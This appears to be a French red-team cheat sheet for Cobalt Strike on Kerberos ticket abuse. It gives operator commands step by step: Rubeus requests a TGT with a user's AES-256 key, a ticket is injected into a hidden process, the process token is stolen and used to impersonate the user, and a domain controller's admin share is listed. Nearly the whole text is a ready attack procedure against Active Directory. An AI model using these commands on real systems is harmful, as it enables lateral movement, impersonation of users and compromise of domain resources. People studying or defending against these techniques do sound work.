
Consiste à réutiliser un ticket kerberos dumpé depuis la mémoire ou en forger un via les techniques Overpass The Hash ou Pass the Key.


# Cobalt Strike

## Pass the Key (AES-256)

Requête d'un ticket grâce à la clé kerberos.

```cmd
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:rsteel /domain:CONTOSO.COM /aes256:05579261e29fb01f23b007a89596353e605ae307afcd1ad3234fa12f94ea6960 /nowrap
```


## Pass the Ticket

> [!Attention]
> Requiert privileges SYSTEM

Créer une nouvelle session dans un nouveau processus caché afin de ne pas écraser les tickets dans la session et injecter le ticket.

```cmd
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\notepad.exe /username:rsteel /domain:CONTOSO.COM /password:FakePass /ticket:[TGT]
```

Voler le token du process et l'ajouter au store

```
token-store steal <pid>
```

Afficher les token dans le store

```
token-store show
```

Utiliser le token (ne pas faire attention au user impersonné indiqué, il s'agit du username qui à lancé le process)

```
token-store use <id>
```

Vérifier que le ticket est présent en cache

```
run klist
```

Vérifier le bon accès aux ressources distantes

```
ls \\lon-dc-1\c$
```

Stopper l'usurpation

```
rev2self
```

Arrêter le processus

```
kill <pid>
```







